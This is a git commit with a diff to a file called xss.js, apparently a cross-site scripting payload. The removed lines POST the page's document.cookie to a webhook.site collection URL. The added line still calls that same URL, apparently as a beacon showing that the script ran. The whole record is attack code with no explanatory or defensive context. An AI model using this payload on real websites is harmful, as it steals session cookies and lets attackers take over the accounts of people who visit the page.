4165687ca797448e9d33e14d481f2be2df4d4ef8
Florian <92117591+FloVerse@users.noreply.github.com>
2025-04-03 10:54:11 +0200

    Update xss.js

--- xss.js
+++ xss.js
@@ -1,4 +1,1 @@
-fetch('https://webhook.site/fd85a4b6-780a-42da-a0c2-76a549fb4810', {
-  method: 'POST',
-  body: document.cookie
-});
+fetch('https://webhook.site/fd85a4b6-780a-42da-a0c2-76a549fb4810');
